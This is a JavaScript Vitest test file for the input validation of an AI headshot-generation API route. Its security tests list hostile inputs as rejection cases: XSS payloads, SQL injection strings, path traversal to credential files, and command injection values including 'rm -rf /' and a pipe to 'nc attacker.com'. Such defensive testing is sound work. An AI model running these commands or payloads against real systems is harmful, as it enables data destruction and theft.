/**
 * Integration Test: API Input Validation (Generate Headshot)
 *
 * Security-critical tests that prevent injection attacks and malicious payloads.
 * Tests the validation logic from generate-headshot/route.js (lines 63-76)
 *
 * What we're testing:
 * 1. Required parameter validation (image, style)
 * 2. Input sanitization (base64 format, style names)
 * 3. Malformed request handling
 * 4. Edge cases (empty strings, null values, special characters)
 */

import { describe, it, expect } from 'vitest';
import { STYLE_PROMPTS } from '@/src/constants/stylePrompts';

/**
 * Request Validator
 *
 * Simulates validation logic from generate-headshot/route.js
 */
class RequestValidator {
  static validateRequest(body) {
    const { image, style } = body || {};

    // Check required fields (line 65-70)
    if (!image || !style) {
      return {
        valid: false,
        error: 'Missing image or style parameter',
        status: 400,
      };
    }

    // Check for empty strings
    if (typeof image !== 'string' || image.trim() === '') {
      return {
        valid: false,
        error: 'Image data cannot be empty',
        status: 400,
      };
    }

    if (typeof style !== 'string' || style.trim() === '') {
      return {
        valid: false,
        error: 'Style cannot be empty',
        status: 400,
      };
    }

    return { valid: true };
  }

  static validateBase64Image(image) {
    // Remove data URL prefix if present (line 73)
    const base64Image = image.replace(/^data:image\/\w+;base64,/, '');

    // Check if valid base64
    const base64Regex = /^[A-Za-z0-9+/=]+$/;
    if (!base64Regex.test(base64Image)) {
      return {
        valid: false,
        error: 'Invalid base64 image data',
      };
    }

    // Check reasonable size (10MB limit = ~13.3MB base64)
    const MAX_BASE64_SIZE = 14 * 1024 * 1024; // 14MB to account for encoding overhead
    if (base64Image.length > MAX_BASE64_SIZE) {
      return {
        valid: false,
        error: 'Image data too large',
      };
    }

    return { valid: true, base64Image };
  }

  static validateStyle(style) {
    // Style must be in STYLE_PROMPTS (line 76)
    if (!STYLE_PROMPTS[style]) {
      return {
        valid: false,
        error: 'Invalid style',
      };
    }

    return { valid: true };
  }

  static sanitizeInput(input) {
    // Remove potential XSS vectors
    if (typeof input !== 'string') return input;

    // Remove HTML tags
    const sanitized = input.replace(/<[^>]*>/g, '');

    // Remove null bytes
    return sanitized.replace(/\0/g, '');
  }
}

describe('API Input Validation - Required Parameters', () => {
  /**
   * Test #1: Missing image parameter
   */
  it('should reject requests missing image parameter', () => {
    const body = {
      style: 'Executive',
      // image is missing
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
    expect(result.error).toBe('Missing image or style parameter');
    expect(result.status).toBe(400);
  });

  /**
   * Test #2: Missing style parameter
   */
  it('should reject requests missing style parameter', () => {
    const body = {
      image: 'data:image/png;base64,iVBORw0KGgo=',
      // style is missing
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
    expect(result.error).toBe('Missing image or style parameter');
    expect(result.status).toBe(400);
  });

  /**
   * Test #3: Both parameters missing
   */
  it('should reject requests with no parameters', () => {
    const body = {};

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
    expect(result.status).toBe(400);
  });

  /**
   * Test #4: Null body
   */
  it('should handle null body gracefully', () => {
    const result = RequestValidator.validateRequest(null);

    expect(result.valid).toBe(false);
    expect(result.error).toBeTruthy();
  });

  /**
   * Test #5: Undefined body
   */
  it('should handle undefined body gracefully', () => {
    const result = RequestValidator.validateRequest(undefined);

    expect(result.valid).toBe(false);
    expect(result.error).toBeTruthy();
  });
});

describe('API Input Validation - Empty Values', () => {
  /**
   * Test #6: Empty string for image
   */
  it('should reject empty string for image', () => {
    const body = {
      image: '',
      style: 'Executive',
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
    expect(result.error).toBe('Missing image or style parameter');
  });

  /**
   * Test #7: Empty string for style
   */
  it('should reject empty string for style', () => {
    const body = {
      image: 'data:image/png;base64,iVBORw0KGgo=',
      style: '',
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
    expect(result.error).toBe('Missing image or style parameter');
  });

  /**
   * Test #8: Whitespace-only strings
   */
  it('should reject whitespace-only values', () => {
    const testCases = [
      { image: '   ', style: 'Executive' },
      { image: 'data:image/png;base64,abc', style: '   ' },
      { image: '\t\n', style: 'Executive' },
    ];

    testCases.forEach((body) => {
      const result = RequestValidator.validateRequest(body);
      expect(result.valid).toBe(false);
    });
  });

  /**
   * Test #9: Null values
   */
  it('should reject null values', () => {
    const testCases = [
      { image: null, style: 'Executive' },
      { image: 'data:image/png;base64,abc', style: null },
    ];

    testCases.forEach((body) => {
      const result = RequestValidator.validateRequest(body);
      expect(result.valid).toBe(false);
    });
  });
});

describe('API Input Validation - Base64 Image Data', () => {
  /**
   * Test #10: Valid base64 with data URL prefix
   */
  it('should accept valid base64 with data URL prefix', () => {
    const validImage = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

    const result = RequestValidator.validateBase64Image(validImage);

    expect(result.valid).toBe(true);
    expect(result.base64Image).toBeTruthy();
    expect(result.base64Image).not.toContain('data:image');
  });

  /**
   * Test #11: Valid base64 without prefix
   */
  it('should accept valid base64 without data URL prefix', () => {
    const validImage = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';

    const result = RequestValidator.validateBase64Image(validImage);

    expect(result.valid).toBe(true);
    expect(result.base64Image).toBe(validImage);
  });

  /**
   * Test #12: Invalid base64 characters
   */
  it('should reject invalid base64 characters', () => {
    const invalidImages = [
      'data:image/png;base64,<script>alert("xss")</script>',
      'data:image/png;base64,../../etc/passwd',
      'data:image/png;base64,@#$%^&*()',
    ];

    invalidImages.forEach((image) => {
      const result = RequestValidator.validateBase64Image(image);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid base64');
    });
  });

  /**
   * Test #13: Excessively large image data
   */
  it('should reject images exceeding size limit', () => {
    // Create a base64 string larger than 14MB
    const largeImage = 'A'.repeat(15 * 1024 * 1024);

    const result = RequestValidator.validateBase64Image(largeImage);

    expect(result.valid).toBe(false);
    expect(result.error).toContain('too large');
  });

  /**
   * Test #14: Accept various image format prefixes
   */
  it('should handle different image format prefixes', () => {
    const formats = [
      'data:image/png;base64,iVBORw0KGgo=',
      'data:image/jpeg;base64,/9j/4AAQSkZJRg==',
      'data:image/jpg;base64,/9j/4AAQSkZJRg==',
      'data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAw',
    ];

    formats.forEach((image) => {
      const result = RequestValidator.validateBase64Image(image);
      expect(result.valid).toBe(true);
    });
  });
});

describe('API Input Validation - Style Parameter', () => {
  /**
   * Test #15: Valid style names
   */
  it('should accept valid style names from STYLE_PROMPTS', () => {
    const validStyles = Object.keys(STYLE_PROMPTS);

    validStyles.forEach((style) => {
      const result = RequestValidator.validateStyle(style);
      expect(result.valid).toBe(true);
    });
  });

  /**
   * Test #16: Invalid style name
   */
  it('should reject invalid style names', () => {
    const invalidStyles = [
      'InvalidStyle',
      'hacker',
      'admin',
      'DROP TABLE users',
      '../../../etc/passwd',
    ];

    invalidStyles.forEach((style) => {
      const result = RequestValidator.validateStyle(style);
      expect(result.valid).toBe(false);
      expect(result.error).toBe('Invalid style');
    });
  });

  /**
   * Test #17: Case-sensitive style validation
   */
  it('should be case-sensitive for style names', () => {
    // STYLE_PROMPTS has "Executive", not "executive"
    const result = RequestValidator.validateStyle('executive');

    if (STYLE_PROMPTS['executive']) {
      expect(result.valid).toBe(true);
    } else {
      expect(result.valid).toBe(false);
    }
  });

  /**
   * Test #18: Special characters in style
   */
  it('should reject styles with special characters', () => {
    const invalidStyles = [
      'Executive<script>',
      'Executive;DROP TABLE',
      'Executive\0',
      'Executive\n\r',
    ];

    invalidStyles.forEach((style) => {
      const result = RequestValidator.validateStyle(style);
      expect(result.valid).toBe(false);
    });
  });
});

describe('API Input Validation - Security & Sanitization', () => {
  /**
   * Test #19: XSS prevention
   */
  it('should sanitize HTML/script tags from input', () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert(1)>',
      '<iframe src="evil.com"></iframe>',
      '"><script>alert(document.cookie)</script>',
    ];

    maliciousInputs.forEach((input) => {
      const sanitized = RequestValidator.sanitizeInput(input);

      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<img');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('onerror');
    });
  });

  /**
   * Test #20: SQL injection prevention
   */
  it('should handle SQL injection attempts safely', () => {
    const sqlInjectionAttempts = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin'--",
      "1' UNION SELECT * FROM users--",
    ];

    // These should be treated as invalid styles
    sqlInjectionAttempts.forEach((attempt) => {
      const result = RequestValidator.validateStyle(attempt);
      expect(result.valid).toBe(false);
    });
  });

  /**
   * Test #21: Null byte injection
   */
  it('should remove null bytes from input', () => {
    const inputWithNullBytes = 'Executive\0malicious';

    const sanitized = RequestValidator.sanitizeInput(inputWithNullBytes);

    expect(sanitized).not.toContain('\0');
    expect(sanitized).toBe('Executivemalicious');
  });

  /**
   * Test #22: Path traversal prevention
   */
  it('should reject path traversal attempts', () => {
    const pathTraversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/etc/shadow',
      'C:\\Windows\\System32\\config\\sam',
    ];

    pathTraversalAttempts.forEach((attempt) => {
      const result = RequestValidator.validateStyle(attempt);
      expect(result.valid).toBe(false);
    });
  });

  /**
   * Test #23: Command injection prevention
   */
  it('should reject command injection attempts', () => {
    const commandInjections = [
      'Executive; rm -rf /',
      'Executive && cat /etc/passwd',
      'Executive | nc attacker.com 1234',
      'Executive`whoami`',
    ];

    commandInjections.forEach((attempt) => {
      const result = RequestValidator.validateStyle(attempt);
      expect(result.valid).toBe(false);
    });
  });
});

describe('API Input Validation - Edge Cases', () => {
  /**
   * Test #24: Very long style names
   */
  it('should handle very long style names', () => {
    const longStyle = 'A'.repeat(10000);

    const result = RequestValidator.validateStyle(longStyle);

    expect(result.valid).toBe(false);
  });

  /**
   * Test #25: Unicode characters
   */
  it('should handle unicode characters in style', () => {
    const unicodeStyles = [
      'Executive™',
      'Emoji😀',
      '中文',
      'العربية',
    ];

    unicodeStyles.forEach((style) => {
      const result = RequestValidator.validateStyle(style);
      // Should be invalid since not in STYLE_PROMPTS
      expect(result.valid).toBe(false);
    });
  });

  /**
   * Test #26: Array instead of string
   */
  it('should handle array inputs gracefully', () => {
    const body = {
      image: ['array', 'of', 'values'],
      style: 'Executive',
    };

    const result = RequestValidator.validateRequest(body);

    // Should be invalid since image must be a string
    expect(result.valid).toBe(false);
  });

  /**
   * Test #27: Object instead of string
   */
  it('should handle object inputs gracefully', () => {
    const body = {
      image: { data: 'base64...' },
      style: 'Executive',
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
  });

  /**
   * Test #28: Number inputs
   */
  it('should reject numeric inputs', () => {
    const body = {
      image: 12345,
      style: 67890,
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
  });

  /**
   * Test #29: Boolean inputs
   */
  it('should reject boolean inputs', () => {
    const body = {
      image: true,
      style: false,
    };

    const result = RequestValidator.validateRequest(body);

    expect(result.valid).toBe(false);
  });
});

describe('API Input Validation - Complete Request Validation', () => {
  /**
   * Test #30: Valid complete request
   */
  it('should accept valid complete request', () => {
    const body = {
      image: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      style: 'Executive',
    };

    const requestValidation = RequestValidator.validateRequest(body);
    expect(requestValidation.valid).toBe(true);

    const imageValidation = RequestValidator.validateBase64Image(body.image);
    expect(imageValidation.valid).toBe(true);

    const styleValidation = RequestValidator.validateStyle(body.style);
    expect(styleValidation.valid).toBe(true);
  });

  /**
   * Test #31: Multiple validation failures
   */
  it('should fail validation when multiple issues exist', () => {
    const body = {
      image: '<script>alert("xss")</script>',
      style: 'InvalidStyle; DROP TABLE',
    };

    const imageValidation = RequestValidator.validateBase64Image(body.image);
    const styleValidation = RequestValidator.validateStyle(body.style);

    expect(imageValidation.valid).toBe(false);
    expect(styleValidation.valid).toBe(false);
  });

  /**
   * Test #32: Extra parameters should be ignored
   */
  it('should handle extra parameters in request', () => {
    const body = {
      image: 'data:image/png;base64,iVBORw0KGgo=',
      style: 'Executive',
      extraParam: 'should be ignored',
      malicious: '<script>alert(1)</script>',
    };

    const result = RequestValidator.validateRequest(body);

    // Should still be valid (extra params ignored)
    expect(result.valid).toBe(true);
  });
});
